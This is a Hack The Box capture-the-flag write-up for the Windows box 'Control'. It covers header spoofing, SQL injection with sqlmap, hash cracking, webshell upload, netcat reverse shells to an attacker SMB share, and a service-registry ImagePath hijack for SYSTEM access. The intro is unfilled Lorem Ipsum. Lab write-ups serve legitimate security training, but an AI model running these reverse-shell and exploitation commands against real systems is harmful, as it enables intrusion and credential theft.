---
layout: single
title: Control - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2020-01-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-control/control_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-control/control_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@p3:/opt/htb/machines/control# nmapAutomatorDirb.sh 10.10.10.167 All
    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Microsoft IIS httpd 10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Fidelity
    135/tcp  open  msrpc   Microsoft Windows RPC
    3306/tcp  open  mysql?
    | fingerprint-strings:
    |   NULL:
    |_    Host '10.10.14.3' is not allowed to connect to this MariaDB server
    49666/tcp open  msrpc   Microsoft Windows RPC
    49667/tcp open  msrpc   Microsoft Windows RPC

    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    Database: MariaDB

    + http://10.10.10.167:80/about.php (CODE:200|SIZE:7867)
    + http://10.10.10.167:80/admin.php (CODE:200|SIZE:89)
    + http://10.10.10.167:80/database.php (CODE:200|SIZE:0)
    + http://10.10.10.167:80/index.php (CODE:200|SIZE:3145)
    + OSVDB-3092: /license.txt: License file found may identify site software.


2. On the website we find a 'To Do'-list commented in the code, giving us the location of SSL Certificates,
   also hinting of a payment system.
    To Do:
     - Import Products
     - Link to new payment system
     - Enable SSL (Certificates location \\192.168.4.28\myfiles)

   http://control.htb/admin.php is Denied, we need to do this through a proxy.
   http://control.htb/database.php is a blank page

   rpcclient without a user doesn't work - Error was NT_STATUS_IO_TIMEOUT
   mysql without a user doesn't work - Host '10.10.14.3' is not allowed to connect to this MariaDB server


3. As stated on admin.php a header option is missing. Adding this up with that they have the SSL Certs on 192.168.4.28/myfiles
   it would make sense that that IP belongs to an admin. We can forge the HTTP GET Request to make it look like it was forwarded from
   that IP using the header X-Forwarded-From: IP-ADDRESS option.

   Burp Repeater:
    GET /admin.php HTTP/1.1
    Host: control.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://control.htb/
    Connection: close
    Upgrade-Insecure-Requests: 1
    X-Forwarded-For: 192.168.4.28

   Via CURL:
    root@p3:/opt/htb/machines/control# curl -H "X-Forwarded-For: 192.168.4.28" -v "http://control.htb/admin.php"

   Or using the Mozilla Firefox addon - HTTP Header Live to modify your requests in real time.


4. On the admin-site we find a few new URLs, search_products.php, create_product.php and create_category.php.
   Being able to request directly in to the database (MariaDB) sounds promising, maybe we can get a shell from here.

   Investigating further and we find view_product.php, and within function.js.

     function viewProduct(id) {
     	document.getElementById("productId").value = id;
     	document.forms["viewProducts"].action = "view_product.php";
     	document.forms["viewProducts"].submit();
     }


5. Here we have a input variable called productId. Trying to inject data to it, it seems to be vulnerable to SQLi (error 500).

   Request, productId=1:
    POST /view_product.php HTTP/1.1
    Host: control.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Length: 11

    productId=1

   Response, productId=1:
    HTTP/1.1 200 OK
    Content-Type: text/html; charset=UTF-8
    Server: Microsoft-IIS/10.0
    X-Powered-By: PHP/7.3.7
    Date: Wed, 15 Jan 2020 13:15:50 GMT
    Connection: close
    Content-Length: 2083

   Request, productId=':
    POST /view_product.php HTTP/1.1
    Host: control.htb
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Content-Type: application/x-www-form-urlencoded
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Length: 11

    productId='

   Response, productId=':
    HTTP/1.1 500 Internal Server Error
    Content-Type: text/html; charset=UTF-8
    Server: Microsoft-IIS/10.0
    X-Powered-By: PHP/7.3.7
    Date: Wed, 15 Jan 2020 13:17:20 GMT
    Connection: close
    Content-Length: 1339


6. Now we can either enumerate the db manually, or use sqlmap. I've tried both methods following the guide linked in "Information",
   however using sqlmap is far quicker.

   root@p3:~/Documents/TelenorCPE# sqlmap -u http://control.htb/view_product.php --data productId=1 --current-user --current-db --passwords --tables
    ..
    [14:09:40] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.0.12
    [14:09:40] [INFO] fetching current user
    current user: 'manager@localhost'
    [14:09:40] [INFO] fetching current database
    current database: 'warehouse'
    [14:09:40] [INFO] fetching database users password hashes
    database management system users password hashes:
    [*] hector [1]:
        password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
    [*] manager [1]:
        password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
    [*] root [1]:
        password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8


7. Add the hashes to a file and crack them using hashcat.
    root@p3:/opt/htb/machines/control# hashcat -a0 -m300 hashes.txt /usr/share/wordlists/rockyou.txt  -o -hashes-cracked.txt
    root@p3:/opt/htb/machines/control# cat ./-hashes-cracked.txt
      0e178792e8fc304a2e3133d535d38caf1da3cd9d:l33th4x0rhector
      cfe3eee434b38cbf709ad67a4dcdea476cba7fda:l3tm3!n

    We find the credentials for hector:l33th4x0rhector and manager:l3tm3!n

    NOTE: l3tm3!n is not normally part of rockyou.txt, I found this hash when cracking via sqlmap and crackstation.net, and then
          added it to my rockyou.txt


8. We have now enumerated thoroughly and two sets of credentials. Using sqlmap we can upload files to the remote host, however
   we don't fully know the root directory of the webserver. Googling this we find that the default web root directories for windows
   are c:\inetpub\wwwroot\, c:\xampp\htdocs\, and/or c:\wamp\www.

   Upload a webshell to one of the directories to see if the victim use a default file structure.

   root@p3:/opt/powercat# sqlmap -u http://control.htb/view_product.php --data productId=1 --file-write="/opt/shells/webshell.php" --file-dest="C:/inetpub/wwwroot/p3.php"
     ..
     [14:24:21] [INFO] the local file '/opt/shells/webshell.php' and the remote file 'C:/inetpub/wwwroot/upload.php' have the same size (7206 B)

   Upload was successfull and we can confirm that C:/inetpub/wwwroot/ is the correct directory. We can now reach the webshell;
    http://control.htb/upload.php


9. Just like the box Sniper we setup a reverse shell using nc64.exe on our local smb share (pub-share).

    Webshell: //10.10.14.3/pub-share/nc64.exe 10.10.14.3 4488 -e powershell

    root@p3:/opt# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.3] from (UNKNOWN) [10.10.10.167] 51674
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\inetpub\wwwroot> whoami
        nt authority\iusr
      PS C:\inetpub\wwwroot> whoami /priv
        Privilege Name          Description                               State
        ======================= ========================================= =======
        SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
        SeImpersonatePrivilege  Impersonate a client after authentication Enabled
        SeCreateGlobalPrivilege Create global objects                     Enabled


10. With the privileges we can execute commands as user Hector, including setting up a new reverse shell with escalated privs.

    Assign Hectors credentials:
      PS C:\inetpub\wwwroot\blog> $user = 'control.htb\hector'
      PS C:\inetpub\wwwroot\blog> $pass = 'l33th4x0rhector' | ConvertTo-SecureString -AsPlainText -Force
      PS C:\inetpub\wwwroot\blog> $creds = New-Object System.Management.Automation.PSCredential($user,$pass)

    Test to make sure it works by executing a command:
      PS C:\inetpub\wwwroot\blog> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }
            control\hector

    Setup a new reverse shell:
      PS C:\inetpub\wwwroot\blog> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.3/pub-share/nc64.exe 10.10.14.3 4499 -e powershell }

    root@p3:/opt/htb/machines/control# nc -lvnp 4499
      listening on [any] 4499 ...
      connect to [10.10.14.3] from (UNKNOWN) [10.10.10.167] 51686
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\Users\Hector\Documents> whoami
        control\hector
      PS C:\Users\Hector\Documents> type C:\Users\Hector\Desktop\user.txt
        d878****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. General enumeration gives us close to nothing. Looking at the PS History of user Hector we find something interesting to follow

    PS C:\Users\Hector\Documents> type C:\Users\Hector\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
      get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
      get-acl HKLM:\SYSTEM\CurrentControlSet | format-list


2. The PS History hints us towards the Registry, so lets look if there are any vulnerable services using AccessChk.exe

      PS C:\Users\Hector\Documents> .\ack.exe "hector" -kvuqsw hklm\System\CurrentControlSet\Services

      Accesschk v6.12 - Reports effective permissions for securable objects
      Copyright (C) 2006-2017 Mark Russinovich
      Sysinternals - www.sysinternals.com

      RW HKLM\System\CurrentControlSet\Services\.NET CLR Data
      	KEY_ALL_ACCESS
      ..

    We get hundreds of lines of output, all saying that all services are writeable with "KEY_ALL_ACCESS" permissions.


3. We need a way to filter the output, giving us the attack vector. We do this in 3 steps.
 A) List all Services in a .txt. The -kw flags list registry key (-k) and only writable services (-w)
  PS C:\Users\Hector\Documents> .\ack.exe "hector" -kw hklm\System\CurrentControlSet\Services > \\10.10.14.11\pub-share\services.txt

 B) Query all services to see which service we are allowed. Sort the allowed services in a list.
  PS C:\Users\Hector\Documents> sc.exe qc applockerfltr

 C) Start all the allowed services from step B, filter the services that we are allowed to start. We now have our attack vector(s)
  PS C:\Users\Hector\Documents> sc.exe start NetSetupSvc


4. We now have a list of vulnerable services that we can exploit. The next steps are time sensitive so we need to be quick.
   Start by changing the binpath of a vulnerable service to do whatever you like, I chose to setup a reverse shell.
    PS C:\Users\Hector\Documents> reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NetSetupSvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Hector\Documents\nc64.exe 10.10.14.11 4400 -e powershell" /f

   Confirm that the path has been changed.
    PS C:\Users\Hector\Documents> reg query "HKLM\System\CurrentControlSet\Services\NetSetupSvc" /v "ImagePath"

      HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\NetSetupSvc
        ImagePath    REG_EXPAND_SZ    C:\Users\Hector\Documents\nc64.exe 10.10.14.11 4400 -e powershell

   Start the service and receive your reverse shell. Grab flag before the service fails.
    PS C:\Users\Hector\Documents> sc.exe start NetSetupSvc
    root@p3:/opt/htb/machines/control# nc -lnvp 4400
      listening on [any] 4400 ...
      connect to [10.10.14.11] from (UNKNOWN) [10.10.10.167] 49903
      Windows PowerShell
      Copyright (C) Microsoft Corporation. All rights reserved.

      PS C:\Windows\system32> whoami
        nt authority\system
      PS C:\Users\Administrator\Desktop> type root.txt
        8f86****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

X-Forwarded-For
  https://en.wikipedia.org/wiki/X-Forwarded-For

SQLi
  https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8
  https://resources.infosecinstitute.com/anatomy-of-an-attack-gaining-reverse-shell-from-sql-injection/#gref

SecList - Web, Root Directory
  https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

Privesc Windows Registry
  https://medium.com/@shy327o/windows-privilege-escalation-insecure-service-1-ec4c428e4800
  https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
  https://www.fuzzysecurity.com/tutorials/16.html
```
